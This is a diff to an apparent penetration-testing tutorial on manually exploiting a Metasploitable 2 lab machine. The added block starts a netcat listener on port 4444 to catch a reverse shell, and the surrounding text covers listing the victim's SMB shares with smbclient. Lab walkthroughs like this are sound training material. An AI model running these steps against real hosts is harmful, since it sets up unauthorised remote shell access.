@@ -30,6 +30,11 @@ It's worth noting in the below examples I am using [Metasploitable 2](https://me
 
 Exploiting this one manually has a few steps but it's not too tricky, it's not exactly efficient but it does the trick! Firstly we need to setup a listening on netcat, open a termninal and use `netcat -nvlp` the actual listener is defined with `l` so you might be wondering what all of this means? Well, `-n` tells Netcat not to resolve names, `-v` specifies to give us a verbose output when printing, `-l` specifies to create the listener as we mentioned and `-p` will create that listener on *any* local port.
 
+```
+root@LinxzSecKali:~# netcat -nvlp 4444
+listening on [any] 4444 ...
+```
+
 Once we have the listener setup we are now going to open a new terminal and check the victims shares, we can do this with `smbclient -L //192.168.139.133` where `-L` will get a list of shares available on a host. We're using Metasploitable 2 as mentioned.
 
 ```
